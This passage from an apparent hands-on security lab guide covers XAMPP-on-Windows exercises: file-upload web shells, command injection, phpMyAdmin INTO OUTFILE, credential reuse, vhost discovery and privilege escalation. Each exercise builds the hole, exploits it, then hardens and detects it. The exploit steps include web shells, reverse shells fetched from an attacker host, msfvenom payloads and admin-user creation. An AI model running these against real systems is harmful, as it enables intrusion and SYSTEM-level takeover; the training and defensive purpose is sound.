Uploaded to uploads/t.php
$ curl -s http://192.168.56.10/app/uploads/t.php
49                                  # PHP executes here → rung 4 satisfied

# 2) Deploy a real shell
$ echo '<?php system($_GET["c"]); ?>' > sh.php
$ curl -s -F "file=@sh.php" http://192.168.56.10/app/upload.php
$ curl -s "http://192.168.56.10/app/uploads/sh.php?c=whoami"
nt authority\system
```

If the app had blocked `.php`, the bypass tree (all worth practising by adding filters in
§3): alternate extensions (`sh.phtml`, `.php5`), double extension (`sh.php.jpg` /
`sh.jpg.php`), content-type spoof (`-F "file=@sh.php;type=image/jpeg"`), magic-byte polyglot
(`GIF89a;<?php ...`), or dropping a `.htaccess` (`AddType application/x-httpd-php .jpg`).

**Why it worked:** no validation + a PHP-executing destination = the uploaded `.php` ran as
the service account.

## §5 Harden it

Fix in code (validate properly) and in config (don't execute in the upload dir) — defence in
depth so either alone stops it.

```php
<?php
// Allow-list extension AND content type; randomise the name; strip the extension you save.
$allowed = ['jpg'=>'image/jpeg','png'=>'image/png','gif'=>'image/gif'];
if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_FILES['file'])) {
    $ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
    $mime = mime_content_type($_FILES['file']['tmp_name']);
    if (!isset($allowed[$ext]) || $allowed[$ext] !== $mime) { die('Rejected'); }
    $name = bin2hex(random_bytes(8)) . '.' . $ext;   // attacker cannot choose name/ext
    move_uploaded_file($_FILES['file']['tmp_name'], "uploads/$name");
    echo "OK";
} ?>
```

**Config safety net** — make the uploads directory refuse to execute PHP. In `httpd.conf`:

```apache
<Directory "C:/xampp/htdocs/app/uploads">
    php_admin_flag engine off        # PHP will NOT run here, ever
    Options -Indexes -ExecCGI
    <FilesMatch "\.(php|phtml|php[0-9]|phar)$">
        Require all denied
    </FilesMatch>
</Directory>
```

Restart Apache. Snapshot `hardened-e5`.

## §6 Verify the fix

```bash
# code rejects non-images:
$ curl -s -F "file=@sh.php" http://192.168.56.10/app/upload.php
Rejected
# even if a .php lands in uploads (e.g. via another bug), it won't execute now:
#   (drop one manually on the box, then:)
$ curl -s http://192.168.56.10/app/uploads/t.php
<?php echo 7*7; ?>                 # returned as TEXT, not 49 → engine off works
# second tool: try the .htaccess bypass — AllowOverride is off so it's ignored
$ curl -s -F "file=@.htaccess" http://192.168.56.10/app/upload.php ; # rejected by ext check anyway
```

## §7 Detect it

- `access.log`: a `POST /app/upload.php` immediately followed by `GET /app/uploads/<name>.php`
  is the upload-then-execute signature; repeated `GET ...?c=` on an uploads file is a live
  web shell.
- On disk: a new `.php`/`.phtml` under `uploads\` (file-integrity monitoring); after
  hardening, requests for such files return the source or 403 — a visible failed attempt.

## 🎓 Lesson

"Upload" isn't "RCE" — five conditions must all hold, and secure design breaks *several* of
them at once: validate on an allow-list, take away the attacker's control of name/extension,
and — most robustly — make the storage directory a place where code simply cannot run
(`engine off`). That last control is the one that saves you when the validation has a bug you
didn't foresee, which is the whole point of defence in depth.

---

# EXERCISE 6 — Command Injection in a Custom Tool

> **Precondition:** app feature that passes input into an OS command.
> **Layer:** ① application code.
> **Privilege needed:** none.
> **MITRE ATT&CK:** T1059 (command execution), T1190.
> **Exam relevance:** high — custom "utility" features (ping, lookup, convert) are classic
> injection points and give direct RCE with no upload/DB needed.
> **Course scenario:** S9 (Command injection in custom PHP).

## §1 What it is

A "network tools" page runs a system utility (`ping`) with a user-supplied argument and
passes it to a shell unsanitised, so shell metacharacters let you append your own commands.

## §2 Why it works

`shell_exec("ping -n 1 " . $_GET['host'])` builds a command string with attacker input and
hands the whole thing to `cmd.exe`. Shell metacharacters (`&`, `&&`, `|`, `;` on some shells)
chain a second command. Because `disable_functions` is empty (confirmed in E1), PHP's
command functions work, so the injected command runs as the Apache account.

## §3 Make it vulnerable

`C:\xampp\htdocs\app\ping.php`:

```php
<?php
// VULNERABLE: user input concatenated into a shell command.
$out = "";
if (isset($_GET['host'])) {
    $out = shell_exec("ping -n 1 " . $_GET['host']);   // no sanitisation
}
?>
<form><input name="host" placeholder="host to ping"><input type="submit"></form>
<pre><?php echo htmlspecialchars($out); ?></pre>
```

Confirm `php.ini` `disable_functions` is empty. Snapshot `vuln-e6`.

## §4 Exploit it

```bash
# Baseline (legit)
$ curl -s "http://192.168.56.10/app/ping.php?host=127.0.0.1"     # normal ping output

# Inject a second command (Windows cmd: & or && chains)
$ curl -s "http://192.168.56.10/app/ping.php?host=127.0.0.1%26whoami"
... nt authority\system
$ curl -s "http://192.168.56.10/app/ping.php?host=127.0.0.1%26%26type+C:\\Windows\\win.ini"

# Reverse shell (host a nc.exe on Kali, pull + run):
$ curl -s "http://192.168.56.10/app/ping.php?host=127.0.0.1%26certutil+-urlcache+-f+http://192.168.56.100:8000/nc.exe+C:\\Windows\\Temp\\nc.exe%26C:\\Windows\\Temp\\nc.exe+192.168.56.100+443+-e+cmd.exe"
# (nc -lvnp 443 waiting on Kali) → SYSTEM shell
```

**Why:** `%26` is `&`; `cmd.exe` ran `ping ... & whoami`, executing your command after the
ping, as the SYSTEM service account.

## §5 Harden it

Never build shell strings from input. Two layers:

```php
<?php
// 1) Validate: only accept a valid IP/hostname (allow-list of characters).
$out = "";
if (isset($_GET['host'])) {
    $host = $_GET['host'];
    if (!filter_var($host, FILTER_VALIDATE_IP) &&
        !preg_match('/^[a-zA-Z0-9.\-]+$/', $host)) {
        die('Invalid host');
    }
    // 2) Avoid the shell entirely: pass args without a shell interpreter.
    $out = shell_exec("ping -n 1 " . escapeshellarg($host));
}
?>
```

Best practice is to avoid shelling out at all (use a native API), but where you must,
`escapeshellarg()` + strict input validation removes the metacharacter avenue. Defence in
depth: set `disable_functions = exec,shell_exec,system,passthru,popen,proc_open` in
`php.ini` if the app doesn't legitimately need them — then even a missed injection can't run
commands. Restart Apache. Snapshot `hardened-e6`.

## §6 Verify the fix

```bash
$ curl -s "http://192.168.56.10/app/ping.php?host=127.0.0.1%26whoami"
Invalid host                         # metacharacters rejected by the allow-list
$ curl -s "http://192.168.56.10/app/ping.php?host=127.0.0.1"
... normal ping output only          # legit path still works
# second check: with disable_functions set, even a crafted bypass returns empty for shell_exec
```

## §7 Detect it

- `access.log`: `?host=` values containing `&`, `|`, `%26`, `certutil`, `powershell`, or IPs
  followed by command names are injection attempts. A request that triggers `certutil`
  downloading `nc.exe` is a strong IoC.
- Windows: **Event ID 4688** (process creation) shows `ping.exe`'s parent as
  `httpd.exe`/`php.exe` and, on injection, a *sibling* `cmd.exe`/`certutil.exe`/`nc.exe`
  spawned by the web server — a web process launching `cmd`/`certutil` is high-fidelity
  malicious.
- Sysmon (if installed) Event ID 1 corroborates the process tree.

## 🎓 Lesson

Command injection is the purest "input reaches a dangerous sink" bug, and the fix is the
purest statement of the principle: don't mix untrusted data with command structure —
validate to an allow-list, and pass arguments so a shell never re-parses them. The
process-creation telemetry (a web server spawning `cmd`/`certutil`) is one of the most
reliable detections in all of Windows defence — worth remembering as both attacker (it's
noisy) and defender (it's catchable).

---

# EXERCISE 7 — Exposed phpMyAdmin → SQL `INTO OUTFILE` → RCE

> **Precondition:** phpMyAdmin reachable; a DB login (blank/weak/reused root) with `FILE`
> privilege; a known web root; permissive `secure_file_priv`.
> **Layer:** ② configuration (default/blank creds, FILE priv) + ③ operational (PMA exposed).
> **Privilege needed:** none → becomes DB admin → OS code execution.
> **MITRE ATT&CK:** T1190, T1505.003, T1078 (valid accounts).
> **Exam relevance:** very high — the classic XAMPP free win and its full descent to RCE.
> **Course scenario:** S4 (Exposed phpMyAdmin).

## §1 What it is

phpMyAdmin at `/phpmyadmin/` lets you log in to MariaDB from the browser. With the historical
XAMPP default of a **blank root password**, that's unauthenticated DB admin. From there, if
the DB user has the `FILE` privilege and file writes aren't restricted, a single SQL query
writes a PHP web shell into the web root — turning DB access into OS code execution.

## §2 Why it works

XAMPP historically ships MariaDB `root` with **no password** and phpMyAdmin configured to let
you in. MariaDB's `SELECT ... INTO OUTFILE` writes query results to a file; if `root` has
`FILE`, `secure_file_priv` is empty (no write restriction), and you know the absolute web
root (harvested in E1), you write `<?php system(...) ?>` to `C:/xampp/htdocs/...`. mod_php
then executes it as the Apache service account.

## §3 Make it vulnerable

Restore the XAMPP-default weak posture:

```sql
-- from C:\xampp\mysql\bin\mysql -u root
SET PASSWORD FOR 'root'@'localhost' = '';        -- blank root (XAMPP default)
-- ensure root has FILE (it does by default) and file writes are unrestricted:
-- check: SELECT @@secure_file_priv;   -- must be '' (empty) or NULL-permissive
```

In `C:\xampp\mysql\bin\my.ini`, ensure there is **no** `secure_file_priv` line restricting
writes (or set it empty), then restart MySQL. In `C:\xampp\phpMyAdmin\config.inc.php` ensure
`$cfg['Servers'][$i]['AllowNoPassword'] = true;` (XAMPP default) so blank-root login is
permitted. Confirm `/phpmyadmin/` is reachable from Kali (it is by default; XAMPP's
`httpd-xampp.conf` historically only restricts it to localhost in "secure" setups — for the
lab, leave it open). Snapshot `vuln-e7`.

## §4 Exploit it

```bash
# 1) Log into phpMyAdmin as root with a blank password (browser), OR straight over MySQL:
$ mysql -h 192.168.56.10 -u root                 # blank password
# (if 3306 is localhost-bound, use the phpMyAdmin web UI instead — same result)

# 2) Verify the OUTFILE preconditions
MariaDB> SELECT current_user(); SHOW GRANTS;               -- FILE present?
MariaDB> SELECT @@secure_file_priv;                        -- '' = writes allowed anywhere

# 3) Write a web shell into the web root (path from E1)
MariaDB> SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE 'C:/xampp/htdocs/app/s.php';

# 4) Execute
$ curl -s "http://192.168.56.10/app/s.php?c=whoami"
nt authority\system
```

**Why:** blank root gave DB admin; `FILE` + empty `secure_file_priv` + the known web root let
`INTO OUTFILE` drop a PHP file Apache then executed as SYSTEM.

## §5 Harden it

Multiple independent fixes — any one breaks the chain; do all (defence in depth):

```sql
-- 1) Set a strong root password and remove blank-password login
SET PASSWORD FOR 'root'@'localhost' = PASSWORD('a-long-random-passphrase');
```

```ini
; 2) my.ini — restrict where the DB may write (kills INTO OUTFILE to the web root)
secure_file_priv = "C:/xampp/mysql/outfiles"     ; a harmless dir, not htdocs
```

```php
// 3) phpMyAdmin config.inc.php — forbid passwordless login
$cfg['Servers'][$i]['AllowNoPassword'] = false;
```

```apache
# 4) httpd-xampp.conf — restrict phpMyAdmin to the local machine only
<Directory "C:/xampp/phpMyAdmin">
    Require local
</Directory>
```

Also drop the `FILE` privilege from application DB accounts (`appuser` never needs it).
Restart MySQL and Apache. Snapshot `hardened-e7`.

## §6 Verify the fix

```bash
# blank root now fails (two tools)
$ mysql -h 192.168.56.10 -u root -e 'select 1'
ERROR 1045 (28000): Access denied for user 'root'@'...'
$ curl -s http://192.168.56.10/phpmyadmin/ -o /dev/null -w '%{http_code}\n'
403                                   # Require local → blocked from Kali
# even with creds, OUTFILE to htdocs now fails:
MariaDB> SELECT "x" INTO OUTFILE 'C:/xampp/htdocs/app/s2.php';
ERROR 1290: The MariaDB server is running with the --secure-file-priv option ...
```

## §7 Detect it

- `access.log`: requests to `/phpmyadmin/` from a non-local IP, then a `GET /app/s.php?c=...`
  — the OUTFILE-shell signature. After hardening, `/phpmyadmin/` from Kali shows as 403s.
- MariaDB general/error log: an `INTO OUTFILE` targeting `htdocs`, and post-fix the
  `secure-file-priv` denial line, are clear IoCs.
- On disk: a new `.php` under `htdocs` created by the *mysqld* process (not Apache) — an
  unusual writer for a web file, catchable by file-integrity monitoring / Sysmon FileCreate.

## 🎓 Lesson

phpMyAdmin is the classic "one login to SYSTEM" descent (web→DB→OS), and its hardening is the
classic defence-in-depth study: four unrelated controls (root password, `secure_file_priv`,
`AllowNoPassword`, `Require local`) each independently break the chain. You don't pick one —
you stack them, because you're defending against the *chain*, and severing any link defeats
it. Least privilege (drop `FILE` from `appuser`) is the quiet fifth control that matters even
if the others are bypassed.

---

# EXERCISE 8 — Weak/Exposed MySQL & Credential Reuse

> **Precondition:** DB reachable (directly or via PMA) with weak/known creds; a credential
> that is reused for an OS account.
> **Layer:** ② configuration (exposure, weak creds) + ③ operational (password reuse).
> **Privilege needed:** none → DB read → OS access via reuse.
> **MITRE ATT&CK:** T1110 (brute/guess), T1078 (valid accounts), T1552 (unsecured creds).
> **Exam relevance:** high — credential reuse from a DB/config to an OS login is one of the
> most common lateral/privesc mechanisms.
> **Course scenario:** S5 (Weak database credentials).

## §1 What it is

The database is reachable with weak or discoverable credentials, and — the real lesson — a
credential found in the DB/config (`appuser:Autumn2026!`) is **reused** as a Windows account
password, turning read-only DB access into an interactive OS session (RDP/WinRM).

## §2 Why it works

Two failures compound: (1) MySQL is exposed on `3306` and/or uses weak creds, so an attacker
reads the app DB (hashes, data) and the app config (the plaintext `appuser` password); (2)
that same password was reused for the `svc_deploy` Windows user (created in Part 0). Humans
reuse passwords across the DB, the app, and their OS/service accounts; attackers spray a
found password everywhere.

## §3 Make it vulnerable

Expose MySQL to the network and keep the reused credential live:

```ini
; C:\xampp\mysql\bin\my.ini — bind to all interfaces (exposes 3306 to Kali)
bind-address = 0.0.0.0
```

Grant `appuser` remote access (simulating a lax setup) and confirm the Windows reuse from
Part 0 (`svc_deploy : Autumn2026!`):

```sql
CREATE USER 'appuser'@'%' IDENTIFIED BY 'Autumn2026!';
GRANT ALL PRIVILEGES ON appdb.* TO 'appuser'@'%';
FLUSH PRIVILEGES;
```

Ensure RDP is enabled on the box (Part 0 added `svc_deploy` to Remote Desktop Users). Restart
MySQL. Snapshot `vuln-e8`.

## §4 Exploit it

```bash
# 1) 3306 exposed?
$ nmap -sV -p3306 192.168.56.10
3306/tcp open  mysql  MariaDB 10.4.x

# 2) Get the credential — from config disclosure (E3/E4) or a weak login
$ curl -s http://192.168.56.10/app/config.php.bak | grep DB_PASS   # appuser:Autumn2026!
# 3) Use it directly on MySQL, read the app DB + hashes
$ mysql -h 192.168.56.10 -u appuser -pAutumn2026! appdb -e "select * from users;"
1  admin  <md5>  admin ...

# 4) THE REUSE — try that same password against the OS
$ crackmapexec smb 192.168.56.10 -u svc_deploy -p 'Autumn2026!'
[+] WIN-XAMPP\svc_deploy:Autumn2026!            # valid OS credential
$ xfreerdp /u:svc_deploy /p:'Autumn2026!' /v:192.168.56.10   # interactive session
# (or evil-winrm if WinRM is enabled)
```

**Why:** the app password sat in a readable config; the same string authenticated a Windows
account. DB access alone was informational, but **reuse** turned it into an OS foothold.

## §5 Harden it

Attack all three failures:

```ini
; 1) my.ini — bind MySQL to localhost so it's not network-reachable
bind-address = 127.0.0.1
```

```sql
-- 2) remove remote DB access; app connects over localhost only
DROP USER 'appuser'@'%';
-- 3) use DISTINCT, strong secrets everywhere (break the reuse)
SET PASSWORD FOR 'appuser'@'localhost' = PASSWORD('db-only-long-random');
```

```cmd
:: 3 cont.) give the Windows account a DIFFERENT strong password than the DB
C:\> net user svc_deploy A-Different-Str0ng-P@ss!
```

The core lesson-fix is **no credential reuse**: the DB password, the app admin password, and
every OS account password must be distinct. Also store app DB creds outside the web root and
never in a `.bak` (E3). Restart MySQL. Snapshot `hardened-e8`.

## §6 Verify the fix

```bash
$ nmap -sV -p3306 192.168.56.10
3306/tcp closed mysql                 # bound to localhost → not reachable
$ mysql -h 192.168.56.10 -u appuser -pAutumn2026! -e 'select 1'
ERROR 2003 (HY000): Can't connect to MySQL server on '192.168.56.10'
# reuse broken: the old app password no longer works for the OS account
$ crackmapexec smb 192.168.56.10 -u svc_deploy -p 'Autumn2026!'
[-] WIN-XAMPP\svc_deploy:Autumn2026! STATUS_LOGON_FAILURE
```

## §7 Detect it

- `nmap`/connection logs: remote connections to 3306 from a workstation IP are abnormal for
  an app whose DB should be localhost-only.
- Windows **Event ID 4625** (failed logon) bursts for `svc_deploy`, then a **4624** success
  from Kali's IP over RDP (LogonType 10) / WinRM (LogonType 3) — the reuse signature.
- MariaDB log: `appuser` connecting from a non-localhost host.

## 🎓 Lesson

DB access is often "only informational" — until a reused password turns it into an OS
session. The dominant defence is boring and absolute: **unique credentials per account and
per service, and least exposure** (localhost-bind the DB). Reuse is the multiplier attackers
count on; distinct secrets remove the multiplier. This is the same Pattern-B bridge the
course privesc chapter hammers — here you both build it and cut it.

---

# EXERCISE 9 — Virtual Host Discovery / Hidden Application

> **Precondition:** Apache serving a name-based vhost not reachable by IP alone.
> **Layer:** ② configuration (vhost) + ③ operational (hidden app left running).
> **Privilege needed:** none.
> **MITRE ATT&CK:** T1595 (active scanning), T1190.
> **Exam relevance:** high — a missed vhost is the #1 reason a XAMPP box looks "empty."
> **Course scenario:** S7 (Virtual host discovery).

## §1 What it is

Apache serves a second site (`dev.app.lab`) only when the request's `Host:` header matches
it. Browsing by IP shows the boring default site; the real, less-hardened dev app is hidden
behind a hostname you must discover, then enumerate as a fresh target.

## §2 Why it works

Name-based virtual hosting means Apache picks the site by `Host` header. A request with
`Host: 192.168.56.10` (what a browser sends) hits the default vhost; the dev vhost only
answers to `Host: dev.app.lab`. Since nothing links that hostname and DNS may not resolve it,
default enumeration never sees it — it's hidden by a *name*, not a password.

## §3 Make it vulnerable

Define two vhosts in `C:\xampp\apache\conf\extra\httpd-vhosts.conf`:

```apache
<VirtualHost *:80>
    ServerName app.lab
    DocumentRoot "C:/xampp/htdocs/app"
</VirtualHost>
<VirtualHost *:80>
    ServerName dev.app.lab
    DocumentRoot "C:/xampp/htdocs/dev"        # a whole second app, only via this hostname
</VirtualHost>
```

Ensure `Include conf/extra/httpd-vhosts.conf` is uncommented in `httpd.conf`. Create
`C:\xampp\htdocs\dev\` with a deliberately weak dev app (e.g. a copy of E5's unrestricted
`upload.php`, or E4's LFI `index.php`) and an HTML comment on the *default* site hinting at
the hostname:

```html
<!-- C:\xampp\htdocs\app\index page footer: TODO: migrate from dev.app.lab before launch -->
```

Optionally give the box a self-signed cert whose SAN lists `dev.app.lab` (teaches the cert-SAN
discovery path). Restart Apache. Snapshot `vuln-e9`.

## §4 Exploit it

```bash
# 1) The default site looks thin. Baseline its size.
$ curl -s http://192.168.56.10/ | wc -c
# 2) Harvest hostnames: read the page source / comments, and the cert SAN
$ curl -s http://192.168.56.10/app/ | grep -i 'dev\.'          # the TODO comment
$ openssl s_client -connect 192.168.56.10:443 </dev/null 2>/dev/null | openssl x509 -noout -ext subjectAltName
    DNS:app.lab, DNS:dev.app.lab
# 3) Or brute the Host header, filtering the default size
$ ffuf -u http://192.168.56.10/ -H "Host: FUZZ.app.lab" \
       -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
dev    [Status: 200, Size: ...]
# 4) Add to /etc/hosts (done in Part 0) and enumerate the dev vhost as a NEW target
$ curl -s http://dev.app.lab/ ; ffuf -u http://dev.app.lab/FUZZ -w .../raft-medium-directories.txt
# → find the weak dev app (LFI/upload) → foothold using E4/E5 technique
```

**Why:** Apache served a different DocumentRoot based on the `Host` header; the hostname came
from a source comment / cert SAN; once known, the hidden dev app was fully exploitable.

## §5 Harden it

The vhost itself isn't the bug — the *exposed, unhardened dev app* is. Fixes:

- **Remove or lock down non-production apps.** Delete `C:\xampp\htdocs\dev\` from the
  production box, or restrict the dev vhost to trusted IPs:

```apache
<VirtualHost *:80>
    ServerName dev.app.lab
    DocumentRoot "C:/xampp/htdocs/dev"
    <Directory "C:/xampp/htdocs/dev">
        Require ip 192.168.56.0/24 127.0.0.1     # or Require local — not the world
    </Directory>
</VirtualHost>
```

- **Stop leaking hostnames:** remove the TODO comment; don't put internal hostnames in
  public certs/source.
- Apply the *same* hardening to the dev app that you applied to prod (it's the same code
  classes — LFI/upload). A hidden app must be as hardened as a visible one. Restart Apache.
  Snapshot `hardened-e9`.

## §6 Verify the fix

```bash
$ curl -s http://dev.app.lab/ -o /dev/null -w '%{http_code}\n'
403                                   # Require ip/local blocks external access
$ curl -s http://192.168.56.10/app/ | grep -i 'dev\.'      # no hostname leak now
# second check: ffuf Host-fuzz still "finds" dev but every hit is 403 (denied, not served)
```

## §7 Detect it

- `access.log`: many requests to `/` with *varying `Host` headers* from one IP is Host-header
  fuzzing (`ffuf` vhost mode). Requests to `dev.app.lab` from outside the trusted range,
  post-fix, show as 403 — visible reconnaissance.
- TLS: certificate transparency / SAN enumeration is off-box, but internally, a cert listing
  internal hostnames is an audit finding.

## 🎓 Lesson

"Security by obscurity" — hiding an app behind a hostname — is not security; the hostname
leaks (comments, certs, source, brute force). Two real defences: **don't run non-production
apps on production**, and if a second site must exist, **access-control it** and harden it
exactly like the primary. The attacker's takeaway (an empty-looking site means *look for a
vhost*) and the defender's (a hidden app is still an exposed app) are two sides of the same
coin.

---

# EXERCISE 10 — Windows Privilege Escalation Through XAMPP

> **Precondition:** code execution as the Apache/MySQL service account (from any of E2–E7).
> **Layer:** ② configuration (service account, permissions) + ③ operational.
> **Privilege needed:** the web-user shell you already have → SYSTEM.
> **MITRE ATT&CK:** T1068 (privilege escalation), T1543.003 (service), T1134 (token
> impersonation).
> **Exam relevance:** high — the second half of nearly every Windows XAMPP box.
> **Course scenario:** S10 (Windows privilege escalation).

This exercise has **four sub-vectors** (A–D). A is the default "you're already SYSTEM" case;
B–D require you to first *reduce* the box to a limited service account so you can practise the
real escalations. Each sub-vector gets its own make-vulnerable / exploit / harden.

## §1 What it is

Turning a web-user shell into SYSTEM/Administrator by abusing how XAMPP's services run and
what the low-privileged account can write or impersonate: (A) Apache already runs as SYSTEM;
(B) a limited service account holds `SeImpersonatePrivilege`; (C) the Apache service binary or
directory is writable by low-priv users; (D) MySQL runs as SYSTEM and you install a UDF.

## §2 Why it works

Services run as an account; whatever executes in the service inherits it. XAMPP's installer
default is Apache/MySQL as **Local System**, so web RCE is SYSTEM (A). When admins run the
service as a limited user, that account is still a *service* account and usually holds
`SeImpersonatePrivilege`, which the Potato family converts to SYSTEM (B). XAMPP also often
sits under a world-writable `C:\xampp`, so a low-priv user can replace the service binary (C).
And MySQL-as-SYSTEM plus a writable plugin dir lets a UDF run OS commands as SYSTEM (D).

---

## Sub-vector A — Apache already runs as SYSTEM (the default)

**§3 Make it vulnerable.** This is the XAMPP default from Part 0 — Apache installed as a
service running as Local System. Confirm: `sc qc Apache2.4` → `SERVICE_START_NAME :
LocalSystem`. Snapshot `vuln-e10a`.

**§4 Exploit it.** Any web RCE from E2/E5/E6/E7:

```bash
$ curl -s "http://192.168.56.10/app/s.php?c=whoami"
nt authority\system                 # already SYSTEM — no escalation needed
$ curl -s "http://192.168.56.10/app/s.php?c=whoami /priv"
```

Collect proof directly: `hostname`, `whoami`, `type C:\Users\Administrator\Desktop\proof.txt`.

**§5 Harden it.** Run Apache as a **dedicated low-privileged service account**, not Local
System:

```cmd
:: create a limited service user and repoint the service
C:\> net user svc_apache A-Long-Random-P@ss! /add
C:\> sc config Apache2.4 obj= ".\svc_apache" password= "A-Long-Random-P@ss!"
:: grant that user only what Apache needs (read/exec on C:\xampp, write on logs/tmp)
C:\> icacls C:\xampp /grant "svc_apache:(OI)(CI)RX"
C:\> icacls C:\xampp\apache\logs /grant "svc_apache:(OI)(CI)M"
C:\> icacls C:\xampp\tmp /grant "svc_apache:(OI)(CI)M"
C:\> sc stop Apache2.4 & sc start Apache2.4
```

**GUI:** `services.msc` → Apache2.4 → Properties → Log On tab → "This account" →
`svc_apache`. Snapshot `hardened-e10a`.

**§6 Verify.** `curl ...?c=whoami` now returns `win-xampp\svc_apache`, not SYSTEM — web RCE
no longer equals SYSTEM. (You must now do B/C to escalate, which is the point.)

**§7 Detect.** Event ID 4688: `httpd.exe` running as `svc_apache` rather than SYSTEM is the
desired state; a web-spawned process as SYSTEM is the alarm.

**🎓 Lesson.** The single highest-impact XAMPP-Windows hardening is *not running the web
server as SYSTEM*. Least-privilege service accounts mean a web bug costs you a sandboxed
account, not the whole machine.

---

## Sub-vector B — SeImpersonatePrivilege → Potato → SYSTEM

**§3 Make it vulnerable.** Apply E10a's hardening (Apache as `svc_apache`), then confirm the
service account has `SeImpersonatePrivilege` (service accounts get it by default; if you used
a plain user, add it via `secpol.msc` → Local Policies → User Rights Assignment → **Impersonate
a client after authentication** → add `svc_apache`). Snapshot `vuln-e10b`.

**§4 Exploit it.** From your web RCE as `svc_apache`:

```bash
$ curl -s "http://192.168.56.10/app/s.php?c=whoami /priv" | grep -i impersonate
SeImpersonatePrivilege        Enabled
# upload PrintSpoofer + nc via the web shell, then:
$ curl -s "http://192.168.56.10/app/s.php?c=certutil -urlcache -f http://192.168.56.100:8000/PrintSpoofer64.exe C:\Windows\Temp\ps.exe"
$ curl -s "http://192.168.56.10/app/s.php?c=C:\Windows\Temp\ps.exe -i -c whoami"
nt authority\system
```

(GodPotato / JuicyPotatoNG work equivalently.) **Why:** `SeImpersonatePrivilege` lets the
Potato technique coerce a SYSTEM token and impersonate it.

**§5 Harden it.** You generally can't remove `SeImpersonate` from a real service account
without breaking services — so the defence is **defence-in-depth around it**: keep the service
account's *other* rights minimal, keep the OS patched (Potato variants exploit specific
COM/RPC behaviours that get mitigated), and — the durable control — prevent the *initial* web
RCE (E2–E7 hardening) so the attacker never reaches this account. Where possible, run the app
in a context without `SeImpersonate` (e.g. IIS AppPool identities with the privilege removed,
or a non-service run). Snapshot `hardened-e10b`.

**§6 Verify.** With the web RCE closed (E5/E6/E7 hardened), the attacker can't get a shell as
`svc_apache` at all, so B is unreachable — verify by confirming the foothold exploits now
fail. If testing B in isolation, a fully-patched OS causes the specific Potato variant to
fail (try two variants to confirm).

**§7 Detect.** Event ID 4688 showing `ps.exe`/`GodPotato.exe` spawned by `httpd.exe`/`php.exe`;
4672 (special privileges) / 4673 assigned to an unexpected process; Sysmon 1 process tree
`httpd → cmd → ps.exe → cmd(SYSTEM)`.

**🎓 Lesson.** Some privileges (`SeImpersonate`) are load-bearing for services and can't just
be revoked — so you defend by preventing the attacker from ever executing *as* that account
(fix the web bug) and by keeping the platform patched. Not every hole is closed at the hole;
sometimes you close the door two steps upstream.

---

## Sub-vector C — Writable service binary / directory

**§3 Make it vulnerable.** Reproduce the loose-permissions case XAMPP is infamous for: make
`C:\xampp` writable by normal users.

```cmd
C:\> icacls C:\xampp /grant "Users:(OI)(CI)M"        # Users can Modify all of C:\xampp
```

Confirm the Apache service binary is now user-writable: `icacls C:\xampp\apache\bin\httpd.exe`.
Snapshot `vuln-e10c`.

**§4 Exploit it.** As the low-priv web user (or `svc_apache`), replace the service binary with
a payload and restart (or await reboot):

```bash
# generate a service-friendly payload on Kali
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.100 LPORT=443 -f exe -o httpd.exe
# via the web shell: back up the real one, drop yours, restart the service
$ curl -s "http://192.168.56.10/app/s.php?c=copy C:\xampp\apache\bin\httpd.exe C:\Windows\Temp\httpd.bak"
$ curl -s "http://192.168.56.10/app/s.php?c=certutil -urlcache -f http://192.168.56.100:8000/httpd.exe C:\xampp\apache\bin\httpd.exe"
$ curl -s "http://192.168.56.10/app/s.php?c=net stop Apache2.4 & net start Apache2.4"
# nc -lvnp 443 on Kali → shell as the service account (SYSTEM if service is LocalSystem)
```

**Why:** the service executes a binary you were allowed to overwrite, so your code runs as the
service account on restart.

**§5 Harden it.** Restore least-privilege ACLs on the XAMPP tree — Users must not have write
to program files/binaries:

```cmd
C:\> icacls C:\xampp /remove:g "Users"
C:\> icacls C:\xampp\apache\bin /inheritance:r /grant "Administrators:(OI)(CI)F" "SYSTEM:(OI)(CI)F" "svc_apache:(OI)(CI)RX"
```

Ideally install XAMPP under `C:\Program Files\` (properly ACL'd) rather than `C:\xampp` at the
drive root. Snapshot `hardened-e10c`.

**§6 Verify.**

```bash
$ curl -s "http://192.168.56.10/app/s.php?c=icacls C:\xampp\apache\bin\httpd.exe"
... Users:(RX)   # read/execute only — no write; overwrite now fails
$ curl -s "http://192.168.56.10/app/s.php?c=echo x > C:\xampp\apache\bin\test.txt & type C:\xampp\apache\bin\test.txt"
Access is denied.
```

Second tool: `accesschk.exe -quv Users C:\xampp\apache\bin\httpd.exe` → no `FILE_WRITE`.

**§7 Detect.** File-integrity monitoring / Sysmon FileCreate on `httpd.exe` being modified;
Event ID 7036 (service stopped/started) at an odd time; 4688 showing the service binary
spawning `cmd`/a reverse shell.

**🎓 Lesson.** Software installed to a world-writable location converts any low-priv foothold
into service-account (often SYSTEM) code execution. Correct ACLs — Administrators/SYSTEM own
the binaries, the service account only reads/executes — are the fix. "Installed to `C:\xampp`
at the drive root with loose ACLs" is a XAMPP signature weakness; move it under Program Files
and lock it down.

---

## Sub-vector D — MySQL-as-SYSTEM + UDF → SYSTEM

**§3 Make it vulnerable.** MySQL installed as a service runs as Local System by default
(Part 0). Confirm `sc qc mysql` → LocalSystem, and that you have DB admin (E7's blank root)
and the plugin dir is writable. Snapshot `vuln-e10d`.

**§4 Exploit it.** With DB admin, install a UDF that executes OS commands as the mysqld
account (SYSTEM):

```sql
-- via phpMyAdmin/mysql as root: write the UDF DLL to the plugin dir, then:
-- (lib_mysqludf_sys.dll dropped to @@plugin_dir via INTO DUMPFILE)
SELECT @@plugin_dir;
SELECT 0x4d5a... INTO DUMPFILE 'C:/xampp/mysql/lib/plugin/udf.dll';   -- the DLL bytes
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.dll';
SELECT sys_exec('net user hacker P@ss123! /add & net localgroup administrators hacker /add');
```

**Why:** `sys_exec` runs its argument via the mysqld process, which is SYSTEM → your command
(adding an admin user) runs as SYSTEM.

**§5 Harden it.** Run MySQL as a low-priv service account (like E10a for Apache), remove
`FILE`/admin from non-essential accounts, and make the plugin dir non-writable by the DB
account:

```cmd
C:\> net user svc_mysql A-Long-Random! /add
C:\> sc config mysql obj= ".\svc_mysql" password= "A-Long-Random!"
